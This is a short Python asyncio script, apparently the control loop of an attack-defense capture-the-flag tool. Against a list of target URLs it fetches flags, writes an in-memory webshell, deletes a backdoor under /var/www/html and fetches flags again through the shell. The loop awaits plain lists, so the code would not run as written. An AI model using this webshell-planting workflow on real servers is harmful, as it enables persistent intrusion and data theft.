import asyncio
from core.flags import Flag
from core.shells import Shell
from utils.utils import Utils
from core.urls import Urls
from core.flags import Flag
from config import Config
async def run():
    while True:
        task_getFlag = [Flag.getFlag(url) for url in Urls.urlList]
        task_writeMemShell = [Shell.writeShell(url) for url in Urls.urlList]
        await task_getFlag
        await task_writeMemShell
        task_delBackdoor = [Utils.delete(url,f"/var/www/html/{Config.backdoorPath}") for url in Urls.urlList]
        await task_delBackdoor
        task_getFlagwithMemShell = [Flag.getFlagwithMemShell(url) for url in Urls.urlList]
        await task_getFlagwithMemShell